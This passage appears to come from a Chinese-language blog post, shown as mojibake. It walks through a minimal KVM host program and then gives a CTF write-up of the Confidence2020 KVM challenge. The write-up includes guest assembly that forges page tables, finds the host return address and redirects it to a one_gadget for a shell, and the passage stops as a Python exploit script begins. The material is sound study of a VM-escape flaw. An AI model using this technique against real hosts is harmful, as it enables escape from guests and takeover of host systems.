class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kvm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* CR0 bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_PE 1u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_MP (1U &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_EM (1U &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_TS (1U &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_ET (1U &lt;&lt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_NE (1U &lt;&lt; 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_WP (1U &lt;&lt; 16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_AM (1U &lt;&lt; 18)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_NW (1U &lt;&lt; 29)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_CD (1U &lt;&lt; 30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_PG (1U &lt;&lt; 31)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR4_PAE (1U &lt;&lt; 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFER_LME (1U &lt;&lt; 8) <span class="comment">// Long mode enable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFER_LMA (1U &lt;&lt; 10) <span class="comment">// long mode active</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_n</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> to_read = count;</span><br><span class="line">    <span class="keyword">char</span> *dst_ptr = dst;</span><br><span class="line">    <span class="keyword">while</span> (to_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> read_res = read(<span class="number">0</span>, dst_ptr, to_read);</span><br><span class="line">        to_read -= read_res;</span><br><span class="line">        dst_ptr += read_res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_kvm_segment</span><span class="params">(struct kvm_segment *v1,struct kvm_segment *v2)</span></span>&#123;</span><br><span class="line">        v1-&gt;base =v2-&gt;base;</span><br><span class="line">        v1-&gt;limit = v2-&gt;limit;</span><br><span class="line">        v1-&gt;selector =v2-&gt;selector;</span><br><span class="line">        v1-&gt;present =v2-&gt;present;</span><br><span class="line">        v1-&gt;type =v2-&gt;type; <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">        v1-&gt;dpl = v2-&gt;dpl;</span><br><span class="line">        v1-&gt;db =v2-&gt;db;</span><br><span class="line">        v1-&gt;s =v2-&gt;s; <span class="comment">/* Code/data */</span></span><br><span class="line">        v1-&gt;l = v2-&gt;l;</span><br><span class="line">        v1-&gt;g =v2-&gt;g; <span class="comment">/* 4KB granularity */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> guest_mem[<span class="number">0x8000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line">    <span class="keyword">char</span> *aligned_guest_mem = guest_mem + (<span class="number">4096</span> - (<span class="keyword">size_t</span>)guest_mem % <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code_size = <span class="number">-1</span>;</span><br><span class="line">    read_n(<span class="keyword">sizeof</span>(<span class="number">4</span>), &amp;code_size);</span><br><span class="line">    <span class="keyword">if</span> (code_size &gt; <span class="number">0x4000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n[init] hold your horses&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_n(code_size, aligned_guest_mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> kvm_fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_CLOEXEC|O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> =</span> &#123;</span><br><span class="line">        .slot = <span class="number">0</span>,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">        .guest_phys_addr = <span class="number">0</span>,</span><br><span class="line">        .memory_size = <span class="number">0x8000</span>,</span><br><span class="line">        .userspace_addr = aligned_guest_mem</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> vcpu_mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">run_mem</span> =</span> mmap(<span class="literal">NULL</span>, vcpu_mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">guest_regs</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs.rsp = <span class="number">0xff0</span>;</span><br><span class="line">    guest_regs.rflags = <span class="number">2</span>; <span class="comment">// required</span></span><br><span class="line">    ioctl(vcpu_fd, KVM_SET_REGS, &amp;guest_regs);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span> <span class="title">guest_sregs</span>;</span></span><br><span class="line">    ioctl(vcpu_fd, KVM_GET_SREGS, &amp;guest_sregs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup paging long mode.</span></span><br><span class="line">    guest_sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;</span><br><span class="line">    guest_sregs.cr4 = CR4_PAE;</span><br><span class="line">    guest_sregs.efer = EFER_LMA | EFER_LME;</span><br><span class="line">    guest_sregs.cr3 = <span class="number">0x4000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x4000</span>) = <span class="number">0x5003</span>; <span class="comment">// P4 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x5000</span>) = <span class="number">0x6003</span>; <span class="comment">// P3 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x6000</span>) = <span class="number">0x7003</span>; <span class="comment">// P2 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7000</span>) = <span class="number">0x3</span>;    <span class="comment">// P1 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7008</span>) = <span class="number">0x1003</span>; <span class="comment">// P1 Table[1]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7010</span>) = <span class="number">0x2003</span>; <span class="comment">// P1 Table[2]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7018</span>) = <span class="number">0x3003</span>; <span class="comment">// P1 Table[3]</span></span><br><span class="line">    <span class="comment">// meaning 0x0, 0x1000, 0x2000, 0x3000 are physical pages</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup segments</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">seg</span> =</span> &#123;</span><br><span class="line">        .base = <span class="number">0</span>,</span><br><span class="line">        .limit = <span class="number">0xffffffff</span>,</span><br><span class="line">        .selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">        .present = <span class="number">1</span>,</span><br><span class="line">        .type = <span class="number">11</span>, <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">        .dpl = <span class="number">0</span>,</span><br><span class="line">        .db = <span class="number">0</span>,</span><br><span class="line">        .s = <span class="number">1</span>, <span class="comment">/* Code/data */</span></span><br><span class="line">        .l = <span class="number">1</span>,</span><br><span class="line">        .g = <span class="number">1</span>, <span class="comment">/* 4KB granularity */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.cs),&amp;seg);</span><br><span class="line">	seg.type = <span class="number">3</span>; <span class="comment">/* Data: read/write, accessed */</span></span><br><span class="line">	seg.selector = <span class="number">2</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.ds),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.es),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.fs),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.gs),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.ss),&amp;seg);</span><br><span class="line">    ioctl(vcpu_fd, KVM_SET_SREGS, &amp;guest_sregs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ioctl(vcpu_fd, KVM_RUN, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (run_mem-&gt;exit_reason == KVM_EXIT_HLT || run_mem-&gt;exit_reason == KVM_EXIT_SHUTDOWN)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (run_mem-&gt;exit_reason == KVM_EXIT_IO) &#123;</span><br><span class="line">            <span class="keyword">if</span> (run_mem-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3f8</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.*s&quot;</span>, </span><br><span class="line">                    run_mem-&gt;io.count * run_mem-&gt;io.size,</span><br><span class="line">                    run_mem-&gt;request_interrupt_window + run_mem-&gt;io.data_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[loop] exit reason: %d\n&quot;</span>, run_mem-&gt;exit_reason);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[loop] goodbye!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆçœ‹äº†ä¸¤å¤©çš„ç†è®ºçŸ¥è¯†ï¼Œç»ˆäºèƒ½å®Œå…¨çœ‹æ‡‚ä¸Šé¢çš„kvmå®ä¾‹äº†ï¼Œä¸»è¦çš„éš¾ç‚¹åœ¨äºç†è§£vcpuçš„ç‰¹æ®Šå¯„å­˜å™¨çš„è®¾ç½®ä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">guest_sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;</span><br><span class="line">guest_sregs.cr4 = CR4_PAE;</span><br><span class="line">guest_sregs.efer = EFER_LMA | EFER_LME;</span><br></pre></td></tr></table></figure>

<p>ä»–é¦–å…ˆè®¾ç½®äº†cr0å¯„å­˜å™¨ï¼Œè¿™ä¸ªå¯„å­˜å™¨æ˜¯æ§åˆ¶å¯„å­˜å™¨ï¼Œæ¯ä¸€ä½éƒ½æ˜¯ä¸€ä¸ªå¼€å…³ï¼Œå…¶ä¸­<code>CR0_PE</code>å°±æ˜¯å¼€èµ·äº†ä¿æŠ¤æ¨¡å¼ï¼Œ<code>CR0_PG</code>å¼€å¯äº†åˆ†é¡µç®¡ç†æ¨¡å¼ï¼Œç›¸å½“äºå¼€èµ·äº†MMUåœ°å€ç¿»è¯‘ï¼Œåç»­è¿˜ä¼šè®¾ç½®é¡µè¡¨å’Œcr3å¯„å­˜å™¨ï¼Œç„¶åcr4å¯„å­˜å™¨å’Œeferå¯„å­˜å™¨çš„è®¾ç½®éƒ½æ˜¯ä¸ºäº†å¼€å¯64ä½æ¨¡å¼ï¼Œå› ä¸ºå¦‚æœå¼€å¯äº†ä¿æŠ¤æ¨¡å¼é»˜è®¤æ˜¯32ä½çš„ã€‚è¿™å—å¤šäºäº†xxrwå­¦é•¿æ‰ç†è§£ã€‚è†œ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220718125951256.png" alt="image-20220718125951256"></p>
<p>ç„¶åä»–è®¾ç½®äº†cr3å¯„å­˜å™¨ç„¶ååˆå§‹åŒ–äº†å››çº§é¡µè¡¨,ç†è§£è¿™å—å¾—éœ€è¦æ“ä½œç³»ç»Ÿä¸­è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€ç¿»è¯‘çš„çŸ¥è¯†ï¼Œå‰ä¸‰çº§é¡µè¡¨éƒ½åªæœ‰ä¸€ä¸ªé¡µè¡¨é¡¹ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§é¡µè¡¨ï¼Œç¬¬å››çº§é¡µè¡¨çš„é¡µè¡¨é¡¹è®°å½•çš„æ˜¯<code>ç‰©ç†åœ°å€</code>ï¼Œä¸€å…±æœ‰å››é¡¹ï¼Œ0,1,2,3,æ‰€ä»¥ä¸€å…±å¯ä»¥ç¿»è¯‘4*4kçš„é¡µé¢ï¼Œæ¯”å¦‚0x0å°±ä¼šè½å…¥ç¬¬å››çº§é¡µè¡¨çš„ç¬¬0é¡¹ï¼Œæœ€åç¿»è¯‘æˆç‰©ç†åœ°å€ä¹Ÿæ˜¯0,0x2000å°±ä¼šè½å…¥ç¬¬å››çº§é¡µè¡¨çš„ç¬¬2é¡¹ï¼Œæœ€åç¿»è¯‘çš„ç‰©ç†åœ°å€æ˜¯0x2000,æ‰€ä»¥è¿™ä¸ªé¡µè¡¨ç¿»è¯‘äº†å’Œæ²¡ç¿»è¯‘å·®ä¸å¤šã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">guest_sregs.cr3 = <span class="number">0x4000</span>;</span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x4000</span>) = <span class="number">0x5003</span>; <span class="comment">// P4 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x5000</span>) = <span class="number">0x6003</span>; <span class="comment">// P3 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x6000</span>) = <span class="number">0x7003</span>; <span class="comment">// P2 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7000</span>) = <span class="number">0x3</span>;    <span class="comment">// P1 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7008</span>) = <span class="number">0x1003</span>; <span class="comment">// P1 Table[1]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7010</span>) = <span class="number">0x2003</span>; <span class="comment">// P1 Table[2]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7018</span>) = <span class="number">0x3003</span>; <span class="comment">// P1 Table[3]</span></span><br><span class="line"><span class="comment">// meaning 0x0, 0x1000, 0x2000, 0x3000 are physical pages</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯æ®µå¯„å­˜å™¨çš„è®¾ç½®äº†ï¼Œä½¿ç”¨çš„æ˜¯<code>kvm_segment</code>ç»“æ„ä½“ï¼Œæˆ‘çš„ç†è§£è¿™ä¸ä»…æ˜¯å¯¹cså¯„å­˜å™¨çš„è®¾ç½®ï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯å¯¹æ®µæè¿°ç¬¦çš„è®¾ç½®ï¼Œè¿™ä¸ª<code>kvm_segment</code>å°±æ˜¯å¯¹æ®µæè¿°ç¬¦çš„è™šæ‹Ÿï¼Œå…¶ä¸­baseå°±æ˜¯æ®µæè¿°ç¬¦çš„åŸºå€ï¼Œlimitæ˜¯æ®µæè¿°ç¬¦çš„é•¿åº¦ï¼Œä»–å’Œ<code>g</code>æ­é…ä½¿ç”¨å½“g=1æ—¶ï¼Œæ®µçš„é•¿åº¦æ˜¯ä»¥4kä¸ºå•ä½çš„ï¼Œæ‰€ä»¥æ®µçš„æœ€å¤§å¤§å°å°±æ˜¯2^32*4K,å¦‚æœg=0,æ®µçš„é•¿åº¦å°±æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ã€‚selectorå’Œpresentä¸æ¸…æ¥šï¼Œtypeå°±æ˜¯è®¾ç½®æ®µæ˜¯ä»€ä¹ˆæ®µï¼Œä¸‹é¢çš„ä»£ç è¡¨ç¤ºæ˜¯ä»£ç æ®µï¼Œæ®µæè¿°ç¬¦æ˜¯ä¿æŠ¤æ¨¡å¼å¿…è¦çš„è¦ç´ ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">seg</span> =</span> &#123;</span><br><span class="line">    .base = <span class="number">0</span>,</span><br><span class="line">    .limit = <span class="number">0xffffffff</span>,</span><br><span class="line">    .selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">    .present = <span class="number">1</span>,</span><br><span class="line">    .type = <span class="number">11</span>, <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">    .dpl = <span class="number">0</span>,</span><br><span class="line">    .db = <span class="number">0</span>,</span><br><span class="line">    .s = <span class="number">1</span>, <span class="comment">/* Code/data */</span></span><br><span class="line">    .l = <span class="number">1</span>,</span><br><span class="line">    .g = <span class="number">1</span>, <span class="comment">/* 4KB granularity */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç¨‹åºå°±è¿›å…¥è™šæ‹Ÿæœºå¼€å§‹æ‰§è¡ŒæŒ‡ä»¤äº†ï¼Œæ—¢ç„¶çœ‹æ‡‚äº†è¿™æ®µä»£ç ç»ˆäºå¯ä»¥æ­£å‘åšé¢˜äº†ã€‚</p>
<h2 id="kvmé¢˜ç›®å¤ç°"><a href="#kvmé¢˜ç›®å¤ç°" class="headerlink" title="kvmé¢˜ç›®å¤ç°"></a>kvmé¢˜ç›®å¤ç°</h2><h3 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h3><p>ä¸»è¦çš„æ¼æ´ç‚¹åœ¨è™šæ‹Ÿvmçš„å†…å­˜æ—¶å€™å‘ç”Ÿäº†é—®é¢˜ï¼Œä»–æŠŠhostç¨‹åºçš„è¿”å›åœ°å€ä¹Ÿæ˜ å°„åˆ°guestå†…å­˜ä¸­ï¼Œå¯¼è‡´å¯ä»¥åœ¨guestä¸­ä¿®æ”¹</p>
<p>hostè¿›ç¨‹çš„è¿”å›åœ°å€ï¼Œç„¶ååˆ©ç”¨<code>hlt</code>æŒ‡ä»¤é€€å‡ºguestè¿”å›hostè¿›ç¨‹ï¼Œç„¶åé€€å‡ºmainå‡½æ•°æ—¶getshell.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">v14 = &amp;s[<span class="number">4096LL</span> - (((<span class="keyword">unsigned</span> __int16)&amp;savedregs + <span class="number">32752</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">  v25[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0x8000</span>LL;</span><br><span class="line">  v28 = v14;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´åˆ©ç”¨ä¸€å…±åˆ†ä¸‰æ­¥ï¼Œç¬¬ä¸€æ­¥ä¼ªé€ æ–°çš„é¡µè¡¨é¡¹ï¼Œå› ä¸ºåŸæ¥é¡µè¡¨é¡¹åªèƒ½è®¿é—®åˆ°[0<del>0x4000],è€Œè¿”å›åœ°å€åœ¨[0x7000</del>0x8000],æ‰€ä»¥å¾—ä¼ªé€ æ–°çš„é¡µè¡¨ï¼Œç„¶åä¿®æ”¹cr3å¯„å­˜å™¨ï¼Œè®©æŒ‡ä»¤å¯ä»¥è®¿é—®åˆ°è¿”å›åœ°å€æ‰€åœ¨çš„åŒºåŸŸ.æˆ‘ä»¬é€‰æ‹©è®©cr3=0x1000</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov qword ptr [0x1000],0x2003</span><br><span class="line">mov qword ptr [0x2000],0x3003</span><br><span class="line">mov qword ptr [0x3000], 0x3</span><br><span class="line">mov qword ptr [0x0], 0x7003</span><br><span class="line">mov rax, 0x1000</span><br><span class="line">mov cr3, rax</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å½“æˆ‘ä»¬è®¿é—®0x0åœ°å€çš„æ—¶å€™ï¼Œå°±ä¼šè®¿é—®åˆ°0x7000çš„åœ°æ–¹ï¼Œç„¶åå¼€å§‹çº¿æ€§æŸ¥æ‰¾ï¼Œæ‰¾åˆ°è¿”å›åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x1050</span><br><span class="line">look_for_return:</span><br><span class="line">	add rax, 0x8</span><br><span class="line">	cmp qword ptr [rax], 0</span><br><span class="line">	je look_for_return</span><br><span class="line">add rax, 0x18</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶raxå°±æŒ‡å‘äº†retrunçš„è¿”å›åœ°å€äº†ï¼Œç„¶åé€šè¿‡åŠ å‡é¢„ç®—æŠŠä»–æ”¹ä¸ºogg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, qword ptr [rax]</span><br><span class="line">add rcx, 0x249e6</span><br><span class="line">mov qword ptr [rax], rcx</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> code <span 